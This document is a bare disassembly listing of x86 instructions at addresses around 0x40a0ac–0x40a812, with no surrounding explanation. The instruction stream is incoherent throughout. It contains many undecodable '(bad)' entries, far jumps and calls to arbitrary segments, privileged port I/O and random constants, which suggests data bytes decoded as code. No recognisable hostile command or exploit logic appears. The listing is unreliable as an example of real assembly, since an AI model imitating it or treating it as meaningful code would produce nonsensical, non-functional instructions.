  40a0ac:	addr16 loopne 0x40a0b0
  40a0af:	or     edx,DWORD PTR [edx]
  40a0b1:	repz dec edi
  40a0b3:	stos   BYTE PTR es:[edi],al
  40a0b4:	loope  0x40a0de
  40a0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0b7:	fwait
  40a0b8:	sbb    eax,0xfa9d2875
  40a0bd:	cwde   
  40a0be:	clc    
  40a0bf:	lods   eax,DWORD PTR ds:[esi]
  40a0c0:	xor    DWORD PTR ds:0x8dc8208a,esi
  40a0c6:	in     eax,0x22
  40a0c8:	int    0xa7
  40a0ca:	int3   
  40a0cb:	jg     0x40a103
  40a0cd:	push   ds
  40a0ce:	push   ds
  40a0cf:	jl     0x40a0d9
  40a0d1:	call   FWORD PTR [esi]
  40a0d3:	dec    ebp
  40a0d4:	and    al,BYTE PTR ss:[eax]
  40a0d7:	mov    WORD PTR [ecx-0x7d014318],?
  40a0dd:	faddp  st(0),st
  40a0df:	push   ebp
  40a0e0:	inc    ebx
  40a0e1:	push   es
  40a0e2:	out    0xc8,al
  40a0e4:	test   DWORD PTR [ecx+0x6],ebx
  40a0e7:	mov    DWORD PTR [edi+eiz*4-0x1c0f5dfe],0x7a215d69
  40a0f2:	xchg   ecx,eax
  40a0f3:	pop    edi
  40a0f4:	repz push esi
  40a0f6:	and    eax,0x2ba2affa
  40a0fb:	cdq    
  40a0fc:	ins    DWORD PTR es:[edi],dx
  40a0fd:	daa    
  40a0fe:	(bad)  
  40a0ff:	pop    eax
  40a100:	cli    
  40a101:	jno    0x40a138
  40a103:	fwait
  40a104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a105:	out    dx,eax
  40a106:	add    DWORD PTR [eax-0x2b0a93fd],eax
  40a10c:	mov    ecx,0xc1cb247f
  40a111:	daa    
  40a112:	retf   0x717a
  40a115:	adc    cl,al
  40a117:	(bad)  
  40a118:	mov    edi,0xab8c5df5
  40a11d:	and    al,0x8e
  40a11f:	sbb    bl,dl
  40a121:	mov    esi,0xc450dbc
  40a126:	iret   
  40a127:	add    dl,ch
  40a129:	fwait
  40a12a:	adc    DWORD PTR [edi],ebp
  40a12c:	or     cl,ch
  40a12e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a12f:	xor    BYTE PTR [ebp+0x7e5d14f6],0xc1
  40a136:	test   eax,0xbe7b5bb
  40a13b:	push   ds
  40a13c:	push   esi
  40a13d:	fidivr WORD PTR [edx+0xfb983c9]
  40a143:	in     eax,0x13
  40a145:	and    BYTE PTR [ebp+0x6180a99a],al
  40a14b:	repnz sbb BYTE PTR [ecx+0x6983fafb],0x6f
  40a153:	je     0x40a184
  40a155:	jns    0x40a1c8
  40a157:	cwde   
  40a158:	test   al,0xab
  40a15a:	inc    esp
  40a15b:	outs   dx,BYTE PTR ds:[esi]
  40a15c:	std    
  40a15d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a15e:	out    0xc7,eax
  40a160:	retf   0x8d82
  40a163:	mov    dh,0x80
  40a165:	mov    bl,0x38
  40a167:	in     al,0x92
  40a169:	push   ebp
  40a16a:	inc    esp
  40a16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a16c:	adc    dl,dh
  40a16e:	fisttp QWORD PTR [eax+ecx*2]
  40a171:	std    
  40a172:	(bad)  
  40a174:	mov    edx,0xc2fd3490
  40a179:	cdq    
  40a17a:	sar    DWORD PTR [edx+esi*2+0x58],0x9d
  40a17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a180:	sub    al,0x63
  40a182:	mov    DWORD PTR [eax-0x9],eax
  40a185:	das    
  40a186:	aas    
  40a187:	xor    dh,BYTE PTR [edi-0x687f36ee]
  40a18d:	mov    dl,0xa1
  40a18f:	hlt    
  40a190:	scas   eax,DWORD PTR es:[edi]
  40a191:	xor    bh,BYTE PTR gs:[ecx+0x3000faf3]
  40a198:	aad    0x64
  40a19a:	cmc    
  40a19b:	xchg   ax,ax
  40a19d:	stc    
  40a19e:	call   0xd2df:0xfd836063
  40a1a5:	pop    es
  40a1a6:	leave  
  40a1a7:	sub    BYTE PTR ds:0x18be3334,bl
  40a1ad:	adc    eax,0x588089b4
  40a1b2:	data16 scas al,BYTE PTR es:[edi]
  40a1b4:	(bad)  [edi+0x7b21aeee]
  40a1ba:	dec    edi
  40a1bb:	push   edx
  40a1bc:	ror    BYTE PTR [ebp+0x731300a6],cl
  40a1c2:	nop
  40a1c3:	xchg   ebp,eax
  40a1c4:	mov    dl,0xaa
  40a1c6:	xor    dh,BYTE PTR [edx]
  40a1c8:	inc    bp
  40a1ca:	mov    al,ds:0x454df61d
  40a1cf:	popf   
  40a1d0:	push   0xeb52fefe
  40a1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d6:	sbb    ecx,ecx
  40a1d8:	aaa    
  40a1d9:	jle    0x40a230
  40a1db:	xchg   BYTE PTR [esi-0x342ed36d],dl
  40a1e1:	popf   
  40a1e2:	stos   BYTE PTR es:[edi],al
  40a1e3:	mov    bh,0x88
  40a1e5:	dec    DWORD PTR [eax+0x70]
  40a1e8:	pop    esp
  40a1e9:	fdiv   DWORD PTR [edi]
  40a1eb:	and    DWORD PTR fs:[ecx+0x3d0df4c4],ebx
  40a1f2:	jae    0x40a1ce
  40a1f4:	pop    ecx
  40a1f5:	add    ah,BYTE PTR [eax+0x6791c15f]
  40a1fb:	inc    ebp
  40a1fc:	push   ebp
  40a1fd:	movaps XMMWORD PTR [eax],xmm0
  40a200:	sbb    ebx,eax
  40a202:	ret    0x1284
  40a205:	cmp    esp,DWORD PTR es:[ebx]
  40a208:	xchg   ecx,eax
  40a209:	(bad)  
  40a20a:	pop    ebx
  40a20b:	dec    edx
  40a20c:	dec    edi
  40a20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a20e:	pop    esp
  40a20f:	sub    eax,0x6a707de7
  40a214:	ret    
  40a215:	test   eax,0xc9ee1dad
  40a21a:	xchg   esp,eax
  40a21b:	shl    eax,cl
  40a21d:	or     edi,DWORD PTR [ecx+0x72727ff2]
  40a223:	xchg   edi,eax
  40a224:	mov    ebp,0xc61abfbb
  40a229:	shl    DWORD PTR [esi+edx*2-0x23],cl
  40a22d:	adc    eax,0xbe4bd98b
  40a232:	lock jmp 0x3697:0x3dbece56
  40a23a:	xchg   DWORD PTR [ecx],eax
  40a23c:	cmp    DWORD PTR [ebx],ecx
  40a23e:	add    bh,BYTE PTR [edx-0x6d3409fa]
  40a244:	cmp    bh,BYTE PTR [ebx-0x784eee7b]
  40a24a:	mov    dl,0x98
  40a24c:	and    esi,DWORD PTR ds:0xdc0cc83c
  40a252:	paddsw mm6,mm1
  40a255:	mov    ch,0x6
  40a257:	jnp    0x40a291
  40a259:	(bad)  
  40a25a:	or     eax,0xdc399f1
  40a25f:	xchg   esi,eax
  40a260:	mov    ah,0x64
  40a262:	mov    esp,0x3d7c8b8b
  40a267:	add    al,0x56
  40a269:	gs jae 0x40a263
  40a26c:	jge    0x40a274
  40a26e:	adc    DWORD PTR [ecx],esi
  40a270:	pop    ss
  40a271:	xor    dh,BYTE PTR ds:0x170311c
  40a277:	sub    DWORD PTR ds:0x8ec032fa,edx
  40a27d:	mov    al,ds:0xdf13e6b
  40a282:	addr16 push 0x70f493ea
  40a288:	lods   al,BYTE PTR ds:[esi]
  40a289:	aam    0xd9
  40a28b:	adc    al,0xb3
  40a28d:	fcom   QWORD PTR [ecx]
  40a28f:	nop
  40a290:	div    DWORD PTR [edx]
  40a292:	cmc    
  40a293:	or     dh,dh
  40a295:	adc    eax,esi
  40a297:	pop    ebp
  40a298:	(bad)  [esi+0x4024064f]
  40a29e:	inc    esi
  40a29f:	push   edi
  40a2a0:	inc    edi
  40a2a1:	jge    0x40a24d
  40a2a3:	mov    edi,edx
  40a2a5:	lods   eax,DWORD PTR ds:[esi]
  40a2a6:	mov    ecx,DWORD PTR [ebx+0x364db5d3]
  40a2ac:	xchg   esp,eax
  40a2ad:	pusha  
  40a2ae:	dec    esp
  40a2af:	jae    0x40a265
  40a2b1:	pop    edx
  40a2b2:	and    ah,BYTE PTR [edi]
  40a2b4:	popf   
  40a2b5:	mov    ch,0x82
  40a2b7:	or     cl,BYTE PTR [ebx]
  40a2b9:	sbb    DWORD PTR [eax+0x50ee4b1a],0xffffffb8
  40a2c0:	addr16 jmp 0x9e12:0x656ecf08
  40a2c8:	xchg   al,bl
  40a2ca:	push   0x60
  40a2cc:	leave  
  40a2cd:	sub    al,0x1a
  40a2cf:	add    BYTE PTR [edx],dh
  40a2d1:	add    cl,dh
  40a2d3:	sub    eax,0xea70aaae
  40a2d8:	dec    ecx
  40a2d9:	jo     0x40a262
  40a2db:	adc    edx,DWORD PTR [esi]
  40a2dd:	xor    BYTE PTR [ebp-0x46],ch
  40a2e0:	fs push eax
  40a2e2:	jecxz  0x40a299
  40a2e4:	jmp    0xaa1f6474
  40a2e9:	add    DWORD PTR [ecx+0x4c],0x20059e0c
  40a2f0:	daa    
  40a2f1:	inc    ebp
  40a2f2:	fldenv [eax]
  40a2f4:	test   eax,0x6e6236dd
  40a2f9:	sub    DWORD PTR [edi-0x47224461],esi
  40a2ff:	inc    esi
  40a300:	imul   ebp,DWORD PTR ds:0xfe8d356a,0x4c
  40a307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a308:	dec    ebx
  40a309:	dec    ecx
  40a30a:	ret    
  40a30b:	dec    esp
  40a30c:	sbb    bh,bh
  40a30e:	ror    BYTE PTR [ecx+0xd],cl
  40a311:	jg     0x40a355
  40a313:	push   ds
  40a314:	push   ds
  40a315:	int3   
  40a316:	leave  
  40a317:	leave  
  40a318:	out    0x19,al
  40a31a:	popf   
  40a31b:	dec    ebp
  40a31c:	adc    edx,DWORD PTR [ebx]
  40a31e:	jno    0x40a327
  40a320:	rcl    BYTE PTR [eax],cl
  40a322:	ins    DWORD PTR es:[edi],dx
  40a323:	sar    ah,0x24
  40a326:	fstp   QWORD PTR [eax]
  40a328:	xor    eax,0x1318c601
  40a32d:	sar    DWORD PTR [edx-0x2c5542e4],cl
  40a333:	and    DWORD PTR [ebx+0x4dc53707],esi
  40a339:	jo     0x40a2d5
  40a33b:	pop    ecx
  40a33c:	adc    al,0x47
  40a33e:	push   0x7b59eb0
  40a343:	popa   
  40a344:	inc    edx
  40a345:	daa    
  40a346:	sti    
  40a347:	cmp    esi,DWORD PTR [eax]
  40a349:	leave  
  40a34a:	jno    0x40a2e2
  40a34c:	jo     0x40a3cd
  40a34e:	mov    ds:0x872574b5,al
  40a353:	add    dh,BYTE PTR [edx-0xaad853c]
  40a359:	loope  0x40a35a
  40a35b:	push   ebx
  40a35c:	lods   eax,DWORD PTR ds:[esi]
  40a35d:	inc    edi
  40a35e:	mov    esp,0x8c8bd1da
  40a363:	mov    edx,0xa49da0ff
  40a368:	mov    ecx,0x5819de4a
  40a36d:	pop    ss
  40a36e:	pop    edx
  40a36f:	test   BYTE PTR [esi-0x195d3402],al
  40a375:	ror    DWORD PTR [esi+0x418265fc],cl
  40a37b:	mov    eax,ds:0x70c820a3
  40a380:	stc    
  40a381:	push   esp
  40a382:	les    eax,FWORD PTR [edi+edi*8]
  40a385:	mov    al,ds:0xcc42e159
  40a38a:	in     eax,0xaf
  40a38c:	int    0xe3
  40a38e:	jecxz  0x40a3c3
  40a390:	popf   
  40a391:	adc    ah,al
  40a393:	mov    ah,0x82
  40a395:	lock mov edi,0x56f75443
  40a39b:	pop    eax
  40a39c:	into   
  40a39d:	call   0x700dc597
  40a3a2:	jg     0x40a326
  40a3a4:	aaa    
  40a3a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a6:	fisubr WORD PTR [ebx+0x70]
  40a3a9:	adc    edx,esp
  40a3ab:	push   ecx
  40a3ac:	mov    eax,ds:0x4f82cc7e
  40a3b1:	int3   
  40a3b2:	dec    edx
  40a3b3:	mov    eax,0x207ec12
  40a3b8:	jbe    0x40a391
  40a3ba:	and    eax,0xd35ab9d6
  40a3bf:	cmp    DWORD PTR [ebx-0x58],esi
  40a3c2:	cmp    BYTE PTR [edi+esi*1+0x71262e48],ah
  40a3c9:	icebp  
  40a3ca:	test   bh,0x45
  40a3cd:	or     al,0xa1
  40a3cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3d0:	or     BYTE PTR [ecx-0x755d9838],ch
  40a3d6:	jecxz  0x40a3a9
  40a3d8:	pop    ss
  40a3d9:	pop    eax
  40a3da:	and    BYTE PTR [edi+eax*4],al
  40a3dd:	sbb    bl,BYTE PTR [ebx-0x7f64246d]
  40a3e3:	es call 0x9697:0x9da714de
  40a3eb:	pop    ebx
  40a3ec:	mov    ds:0xc8024501,eax
  40a3f1:	leave  
  40a3f2:	jmp    0x7f95:0x76b84323
  40a3f9:	or     DWORD PTR [eax-0x31],edx
  40a3fc:	jae    0x40a3ed
  40a3fe:	or     DWORD PTR [esi],edx
  40a400:	int    0xc
  40a402:	sub    bl,ah
  40a404:	mov    esi,0x613e68a1
  40a409:	or     cl,dl
  40a40b:	stc    
  40a40c:	mov    ch,0x6b
  40a40e:	icebp  
  40a40f:	jle    0x40a46c
  40a411:	dec    eax
  40a412:	out    dx,al
  40a413:	idiv   BYTE PTR [ebx-0xb6df54e]
  40a419:	xlat   BYTE PTR cs:[ebx]
  40a41b:	pusha  
  40a41c:	ret    0x9e07
  40a41f:	lahf   
  40a420:	sub    BYTE PTR [esi],0x54
  40a423:	sti    
  40a424:	sub    esi,ecx
  40a426:	sbb    BYTE PTR [eax-0x32],cl
  40a429:	fcom   DWORD PTR [edi]
  40a42b:	sbb    esp,DWORD PTR [eax+ebp*4-0x1a]
  40a42f:	rol    eax,0xf4
  40a432:	xchg   bp,ax
  40a434:	inc    edi
  40a435:	je     0x40a408
  40a437:	(bad)  [esi]
  40a439:	xor    eax,0xf0e39f56
  40a43e:	aam    0x9a
  40a440:	add    edi,edi
  40a442:	mov    dh,0xfe
  40a444:	out    0x8a,al
  40a446:	mov    BYTE PTR [ecx+0x4b],bh
  40a449:	inc    ecx
  40a44a:	and    eax,0xb6a15cee
  40a44f:	and    BYTE PTR [edx-0x60],bh
  40a452:	push   esi
  40a453:	dec    esp
  40a454:	cmp    al,dl
  40a456:	dec    edx
  40a457:	xchg   ebx,eax
  40a458:	enter  0x6530,0xc3
  40a45c:	dec    edx
  40a45d:	lea    ecx,[esi-0x57]
  40a460:	cld    
  40a461:	jecxz  0x40a40b
  40a463:	add    DWORD PTR [edi+0x4ed27c7],ebx
  40a469:	sbb    DWORD PTR [ebx+esi*1+0xa338445],0xffffff83
  40a471:	jno    0x40a485
  40a473:	jl     0x40a3ff
  40a475:	ja     0x40a4a0
  40a477:	cmp    al,0x9c
  40a479:	sbb    ecx,DWORD PTR [ebp+0x5a]
  40a47c:	cli    
  40a47d:	xchg   edi,eax
  40a47e:	xchg   esi,eax
  40a47f:	pop    es
  40a480:	scas   al,BYTE PTR es:[edi]
  40a481:	mov    edx,0xb440e4d0
  40a486:	les    edi,FWORD PTR [edx-0x2d]
  40a489:	scas   al,BYTE PTR es:[edi]
  40a48a:	addr16 push edx
  40a48c:	xor    BYTE PTR [esi+0x6e],ch
  40a48f:	mov    cl,cl
  40a491:	dec    esi
  40a492:	adc    dl,ch
  40a494:	loop   0x40a4d7
  40a496:	call   0x49906b82
  40a49b:	fdivrp st(2),st
  40a49d:	stos   DWORD PTR es:[edi],eax
  40a49e:	xchg   ecx,eax
  40a49f:	xchg   DWORD PTR [ebp-0x4f4695c4],ebp
  40a4a5:	push   edi
  40a4a6:	fcomp  DWORD PTR [eax]
  40a4a8:	repz adc al,0x84
  40a4ab:	push   edx
  40a4ac:	out    dx,eax
  40a4ad:	cld    
  40a4ae:	add    ah,BYTE PTR [ebx]
  40a4b0:	xchg   esi,eax
  40a4b1:	sbb    al,0x47
  40a4b3:	push   esp
  40a4b4:	mov    bh,0x22
  40a4b6:	adc    al,BYTE PTR [eax-0x55]
  40a4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4ba:	popf   
  40a4bb:	jmp    0xb524599e
  40a4c0:	xor    esi,DWORD PTR [edi-0x4fa3841c]
  40a4c6:	add    al,al
  40a4c8:	jmp    0x40a53d
  40a4ca:	xchg   edi,eax
  40a4cb:	push   esp
  40a4cc:	outs   dx,BYTE PTR ds:[esi]
  40a4cd:	pop    ebx
  40a4ce:	dec    ecx
  40a4cf:	or     ebx,ebp
  40a4d1:	and    eax,0xb13a7ad1
  40a4d6:	xchg   edx,eax
  40a4d7:	cdq    
  40a4d8:	mov    ch,0xc2
  40a4da:	ja     0x40a514
  40a4dc:	loop   0x40a46e
  40a4de:	cld    
  40a4df:	pop    edx
  40a4e0:	imul   ebx,DWORD PTR ds:0x519f5d7a,0xe511b74a
  40a4ea:	aaa    
  40a4eb:	test   eax,0xc5cd7762
  40a4f0:	out    0x40,eax
  40a4f2:	or     eax,0xd3ff1b2d
  40a4f7:	or     ah,0x4c
  40a4fa:	xchg   DWORD PTR [edx],ebx
  40a4fc:	add    BYTE PTR [ebx+0x4ad4d9ee],cl
  40a502:	or     eax,0xaf3333c8
  40a507:	pop    ss
  40a508:	inc    esp
  40a509:	shld   DWORD PTR [ecx+ebx*8-0x6f52be3],eax,cl
  40a511:	addr16 cs xchg esi,eax
  40a514:	scas   al,BYTE PTR es:[edi]
  40a515:	pop    ds
  40a516:	or     al,0xab
  40a518:	ficom  WORD PTR fs:[edx]
  40a51b:	(bad)  
  40a51c:	xchg   ebx,eax
  40a51d:	(bad)  
  40a51e:	cs out dx,al
  40a520:	jnp    0x40a515
  40a522:	mov    ebp,0xf9750d17
  40a527:	pop    esi
  40a528:	ins    BYTE PTR es:[edi],dx
  40a529:	adc    ah,ch
  40a52b:	and    al,0x2b
  40a52d:	xchg   esp,eax
  40a52e:	jecxz  0x40a552
  40a530:	sbb    esp,ebp
  40a532:	dec    ebp
  40a533:	pop    esp
  40a534:	ret    0x728a
  40a537:	fisub  WORD PTR [edx+0x21]
  40a53a:	lea    esp,[edi]
  40a53c:	arpl   WORD PTR [esi+0x37],dx
  40a53f:	mov    ch,0x7
  40a541:	push   ds
  40a542:	xchg   edi,eax
  40a543:	or     BYTE PTR [ecx],0x46
  40a546:	sub    dh,dh
  40a548:	jb     0x40a528
  40a54a:	sbb    eax,0xc45ef7c4
  40a54f:	(bad)  
  40a550:	fadd   DWORD PTR [eax]
  40a552:	pop    ebx
  40a553:	(bad)  
  40a555:	and    al,0x18
  40a557:	shl    bl,0x89
  40a55a:	out    0x91,al
  40a55c:	sbb    BYTE PTR [bx],bh
  40a55f:	mov    ecx,edi
  40a561:	in     al,dx
  40a562:	call   DWORD PTR [edi]
  40a564:	ret    
  40a565:	jnp    0x40a53f
  40a567:	sub    esi,DWORD PTR [ebp+0x484ef70f]
  40a56d:	cmp    eax,0xd61bb2a6
  40a572:	cmp    DWORD PTR ds:0x6f7699cb,edi
  40a578:	xchg   DWORD PTR [ebp-0xd7ff751],eax
  40a57e:	sub    eax,0x3823deab
  40a583:	cmp    ch,al
  40a585:	cs int3 
  40a587:	pop    ecx
  40a588:	sub    BYTE PTR [ebx-0x78],al
  40a58b:	fs outs dx,DWORD PTR ss:[esi]
  40a58e:	scas   eax,DWORD PTR es:[edi]
  40a58f:	mov    cs,edi
  40a591:	lods   eax,DWORD PTR ds:[esi]
  40a592:	mov    ebx,0xd94f09fb
  40a597:	inc    ebp
  40a598:	pop    ds
  40a599:	mov    dh,0x28
  40a59b:	dec    edx
  40a59c:	arpl   WORD PTR [esp+esi*1+0x54f57094],cx
  40a5a3:	pop    edi
  40a5a4:	add    esi,0xb7cd8306
  40a5aa:	repz jae 0x40a568
  40a5ad:	sub    eax,0xcab46cf8
  40a5b2:	nop
  40a5b3:	sti    
  40a5b4:	js     0x40a5e4
  40a5b6:	mov    ds:0x99a1decd,eax
  40a5bb:	push   edx
  40a5bc:	sbb    ch,dh
  40a5be:	xor    DWORD PTR [ecx],ebx
  40a5c0:	fisub  DWORD PTR [esi+0x6d]
  40a5c3:	mov    bl,0xbe
  40a5c5:	repz les ebp,FWORD PTR [edx-0x75]
  40a5c9:	add    BYTE PTR [edx+0x6c],al
  40a5cc:	push   ds
  40a5cd:	sub    BYTE PTR [eax+0x55780b11],ch
  40a5d3:	lahf   
  40a5d4:	mov    WORD PTR [ebx+0x63074ba9],?
  40a5da:	adc    ebx,edx
  40a5dc:	add    edx,DWORD PTR es:[eax-0x32]
  40a5e0:	pop    edx
  40a5e1:	sbb    ebp,DWORD PTR [edx]
  40a5e3:	or     bh,bh
  40a5e5:	mov    ds:0x981c74f6,al
  40a5ea:	std    
  40a5eb:	bound  ebx,QWORD PTR [edi]
  40a5ed:	stos   BYTE PTR es:[edi],al
  40a5ee:	jg     0x40a63f
  40a5f0:	dec    esp
  40a5f1:	sub    edi,DWORD PTR [esi-0x78]
  40a5f4:	sahf   
  40a5f5:	rol    DWORD PTR [edx+ebp*8-0x7e],1
  40a5f9:	pop    esp
  40a5fa:	dec    esi
  40a5fb:	dec    esp
  40a5fd:	in     eax,0x43
  40a5ff:	call   0x61fc:0xc6f960e4
  40a606:	dec    edx
  40a607:	data16 lock mov al,al
  40a60b:	sbb    BYTE PTR [ecx],0xee
  40a60e:	div    BYTE PTR [ecx+0x3d]
  40a611:	mov    ah,0xc8
  40a613:	cmp    al,0x8d
  40a615:	fld    TBYTE PTR [edx+0x34b24b78]
  40a61b:	add    cl,BYTE PTR [eax-0x2]
  40a61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a61f:	jmp    0x2e5f5a45
  40a624:	fwait
  40a625:	pop    ebx
  40a626:	dec    esi
  40a627:	or     eax,0xf862e9e0
  40a62c:	and    eax,0x66829bcc
  40a631:	sub    eax,0xa27aadf3
  40a636:	icebp  
  40a637:	lods   al,BYTE PTR ds:[esi]
  40a638:	jno    0x40a64f
  40a63a:	mov    al,0xea
  40a63c:	jmp    0x40a643
  40a63e:	xor    DWORD PTR [edx+0x78f687e9],eax
  40a644:	ror    WORD PTR ss:[edx+0x764ba3f2],0x65
  40a64d:	rol    dh,0x1f
  40a650:	shr    DWORD PTR ds:0x9b25f833,1
  40a656:	int    0x8f
  40a658:	mov    esi,0x2df0f1c6
  40a65d:	cmp    ebp,DWORD PTR [esi-0x21]
  40a660:	add    BYTE PTR [ecx+esi*8-0xe280b29],ch
  40a667:	retf   
  40a668:	popf   
  40a669:	cld    
  40a66a:	jmp    DWORD PTR [ecx+0x12c756b0]
  40a670:	or     dl,BYTE PTR es:[esi]
  40a673:	xor    ebp,ebx
  40a675:	pop    esp
  40a676:	std    
  40a677:	dec    ebp
  40a678:	lods   eax,DWORD PTR ds:[esi]
  40a679:	sub    bh,ah
  40a67b:	inc    edi
  40a67c:	adc    BYTE PTR [ecx-0x1b4eada2],al
  40a682:	call   0xd80e84a1
  40a687:	lods   al,BYTE PTR ds:[esi]
  40a688:	gs xchg ecx,eax
  40a68a:	imul   esi,DWORD PTR [ebx-0x3ff1c206],0xbc328563
  40a694:	xor    edx,DWORD PTR [ecx-0x741a6132]
  40a69a:	or     BYTE PTR [eax-0x78cec377],bh
  40a6a0:	in     eax,dx
  40a6a1:	xchg   ebx,eax
  40a6a2:	(bad)  
  40a6a3:	loop   0x40a654
  40a6a5:	and    edx,ebx
  40a6a7:	adc    edi,DWORD PTR [esi]
  40a6a9:	sti    
  40a6aa:	minps  xmm7,xmm5
  40a6ad:	inc    esi
  40a6ae:	mov    bh,0xa8
  40a6b0:	addr16 push ds
  40a6b2:	xchg   edi,eax
  40a6b3:	icebp  
  40a6b4:	rcl    ebp,0x29
  40a6b7:	scas   al,BYTE PTR es:[edi]
  40a6b8:	xor    al,0x61
  40a6ba:	or     cl,bh
  40a6bc:	mov    edi,0x30e915c2
  40a6c1:	cmp    al,BYTE PTR [esp+ecx*2-0x7a]
  40a6c5:	ficomp DWORD PTR [esi]
  40a6c7:	xchg   ebx,eax
  40a6c8:	jp     0x40a6b0
  40a6ca:	stc    
  40a6cb:	out    dx,al
  40a6cc:	and    BYTE PTR [ebx+0x5d579746],ch
  40a6d2:	jecxz  0x40a682
  40a6d4:	sahf   
  40a6d5:	xlat   BYTE PTR ds:[bx]
  40a6d7:	fs jge 0x40a6e8
  40a6da:	mov    BYTE PTR [ebp+0x5037310f],dl
  40a6e0:	arpl   WORD PTR [edx+0x40],cx
  40a6e3:	jbe    0x40a74a
  40a6e5:	cdq    
  40a6e6:	jmp    FWORD PTR [eax+0x6a89dbb5]
  40a6ec:	add    al,0x5b
  40a6ee:	mov    fs,WORD PTR [edi-0x57]
  40a6f1:	daa    
  40a6f2:	fst    QWORD PTR [esi]
  40a6f4:	leave  
  40a6f5:	lods   al,BYTE PTR ds:[esi]
  40a6f6:	sub    dl,dh
  40a6f8:	or     BYTE PTR [ebx],ah
  40a6fa:	stos   BYTE PTR es:[edi],al
  40a6fb:	lds    ebx,FWORD PTR [eax+0x4410254]
  40a701:	adc    esi,DWORD PTR [ebp+0x14cfec41]
  40a707:	adc    BYTE PTR [edx+0xc],cl
  40a70a:	repz mov dl,0x70
  40a70d:	sbb    bl,BYTE PTR [eax+0x210abb3d]
  40a713:	int3   
  40a714:	in     al,dx
  40a715:	mov    dh,0x4f
  40a717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a718:	sti    
  40a719:	mov    ebx,0xc6448ef
  40a71e:	inc    ebp
  40a71f:	shl    DWORD PTR [ebx+eiz*8+0x49c4e879],0x87
  40a727:	cmp    al,0xb9
  40a729:	xchg   esp,eax
  40a72a:	pop    edx
  40a72b:	aaa    
  40a72c:	mov    ds:0x5fdd45a,eax
  40a731:	clc    
  40a732:	addr16 (bad) 
  40a734:	shl    BYTE PTR [eax],cl
  40a736:	jmp    0x40a74c
  40a738:	push   edi
  40a739:	int3   
  40a73a:	out    dx,al
  40a73b:	mov    gs,esi
  40a73d:	sti    
  40a73e:	out    0x2a,eax
  40a740:	pop    ss
  40a741:	fisubr WORD PTR [ebx]
  40a743:	inc    ecx
  40a744:	mov    ds:0x2d8d87fd,eax
  40a749:	lahf   
  40a74a:	xor    BYTE PTR [eax],al
  40a74c:	fadd   QWORD PTR [edi]
  40a74e:	dec    edx
  40a74f:	inc    esp
  40a750:	inc    ebp
  40a751:	jmp    0xf0c4a488
  40a756:	rcr    DWORD PTR [ecx],cl
  40a758:	sub    DWORD PTR [ecx-0x2174e403],0x67d48cda
  40a762:	inc    ebx
  40a763:	ds push ss
  40a765:	xchg   edx,eax
  40a766:	push   es
  40a767:	xor    ebp,ebp
  40a769:	inc    BYTE PTR [eax-0x63]
  40a76c:	mov    esp,0x5288d4bf
  40a771:	lahf   
  40a772:	mov    esi,0xf4a387f6
  40a777:	lock pop ebp
  40a779:	(bad)  [ecx]
  40a77b:	pusha  
  40a77c:	fstp   DWORD PTR [ebp+0x7c]
  40a77f:	stos   DWORD PTR es:[edi],eax
  40a780:	loope  0x40a774
  40a782:	ret    
  40a783:	hlt    
  40a784:	sbb    DWORD PTR [esi-0x31aa3b90],ecx
  40a78a:	fbstp  TBYTE PTR [esi+0x1e]
  40a78d:	pop    ecx
  40a78e:	js     0x40a778
  40a790:	arpl   WORD PTR [edi],bp
  40a792:	inc    eax
  40a793:	cmp    bh,cl
  40a795:	outs   dx,BYTE PTR ds:[esi]
  40a796:	in     al,dx
  40a797:	dec    edi
  40a798:	push   ecx
  40a799:	mov    edx,0x9aab4e2f
  40a79e:	sub    ebx,ebx
  40a7a0:	jge    0x40a74e
  40a7a2:	(bad)  
  40a7a3:	dec    edx
  40a7a4:	fist   WORD PTR [esi+0x7]
  40a7a7:	out    dx,al
  40a7a8:	stc    
  40a7a9:	lea    sp,[ebp-0x66]
  40a7ad:	jecxz  0x40a821
  40a7af:	jnp    0x40a7c6
  40a7b1:	or     dl,BYTE PTR [ebx]
  40a7b3:	clc    
  40a7b4:	mov    BYTE PTR [ecx-0x325fe81],dl
  40a7ba:	cmp    edi,ebp
  40a7bc:	ja     0x40a7bc
  40a7be:	add    BYTE PTR [edi-0x37],ah
  40a7c1:	mov    dl,0x34
  40a7c3:	fwait
  40a7c4:	xlat   BYTE PTR ds:[ebx]
  40a7c5:	int    0x22
  40a7c7:	pop    edi
  40a7c8:	inc    esp
  40a7c9:	js     0x40a792
  40a7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7cc:	mov    eax,0x8fe4caf4
  40a7d1:	push   esp
  40a7d2:	imul   ebp,esi,0xffffffba
  40a7d5:	jns    0x40a826
  40a7d7:	loope  0x40a7b7
  40a7d9:	cmp    DWORD PTR [ebp+0x8],esp
  40a7dc:	dec    ecx
  40a7dd:	int3   
  40a7de:	pop    ebx
  40a7df:	(bad)  
  40a7e0:	adc    ebp,ebx
  40a7e2:	fsubr  DWORD PTR [ecx-0x44]
  40a7e5:	shr    DWORD PTR [edi+0x3def2f60],0x15
  40a7ec:	inc    esi
  40a7ed:	pop    ds
  40a7ee:	push   edx
  40a7ef:	rcr    DWORD PTR [esi],0x86
  40a7f2:	adc    al,0x26
  40a7f4:	jp     0x40a7c5
  40a7f6:	push   ebp
  40a7f7:	mov    edx,0xa95cd55e
  40a7fc:	test   DWORD PTR [ecx+0x4f00c18c],ebp
  40a802:	into   
  40a803:	and    eax,0x1cb4f5
  40a808:	imul   eax,DWORD PTR [edi-0x6e],0xffffffc6
  40a80c:	dec    edx
  40a80d:	out    0xcc,al
  40a80f:	(bad)  
  40a811:	pop    ecx
  40a812:	dec    ecx
